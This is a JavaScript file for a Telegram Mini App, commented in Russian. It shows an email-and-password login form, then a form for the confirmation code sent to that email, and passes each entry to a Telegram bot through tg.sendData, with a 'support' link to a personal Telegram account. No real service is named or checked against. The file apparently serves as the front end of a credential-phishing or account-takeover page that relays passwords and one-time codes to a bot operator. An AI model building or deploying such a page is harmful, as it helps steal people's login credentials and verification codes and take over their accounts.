// Инициализация Telegram WebApp
const tg = window.Telegram.WebApp;

// Расширяем приложение на весь экран
tg.expand();

// Получаем элементы
const loginForm = document.getElementById('loginForm');
const codeForm = document.getElementById('codeForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const codeInput = document.getElementById('codeInput');
const submitBtn = document.getElementById('submitBtn');
const submitCodeBtn = document.getElementById('submitCodeBtn');
const messageDiv = document.getElementById('message');

// Функция для отображения сообщений
function showMessage(text, type = 'info') {
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

// Отправка данных на вход
submitBtn.addEventListener('click', function() {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (!email || !password) {
        showMessage('Пожалуйста, заполните все поля', 'error');
        return;
    }
    
    // Отправляем данные в бота
    const data = {
        email: email,
        password: password
    };
    
    tg.sendData(JSON.stringify(data));
    showMessage('Данные отправлены, ожидайте подтверждения', 'info');
});

// Отправка кода подтверждения
submitCodeBtn.addEventListener('click', function() {
    const code = codeInput.value.trim();
    
    if (!code) {
        showMessage('Пожалуйста, введите код', 'error');
        return;
    }
    
    // Отправляем код в бота
    tg.sendData(JSON.stringify({
        code: code
    }));
    
    showMessage('Код отправлен на проверку', 'info');
    codeInput.value = '';
});

// Поддержка Enter для полей ввода
emailInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        passwordInput.focus();
    }
});

passwordInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        submitBtn.click();
    }
});

codeInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        submitCodeBtn.click();
    }
});

// Функция открытия поддержки
function openSupport() {
    window.open('https://t.me/potok457', '_blank');
}

// Обработка данных из бота (если нужно)
tg.onEvent('mainButtonClicked', function() {
    // Действие при нажатии главной кнопки
});

// Если данные приходят из бота
document.addEventListener('DOMContentLoaded', function() {
    // Проверка, есть ли параметры в URL
    const urlParams = new URLSearchParams(window.location.search);
    const action = urlParams.get('action');
    
    if (action === 'show_code') {
        loginForm.style.display = 'none';
        codeForm.style.display = 'block';
        showMessage('Введите код с почты', 'info');
    }
});

// Готово
console.log('Mini App загружен');
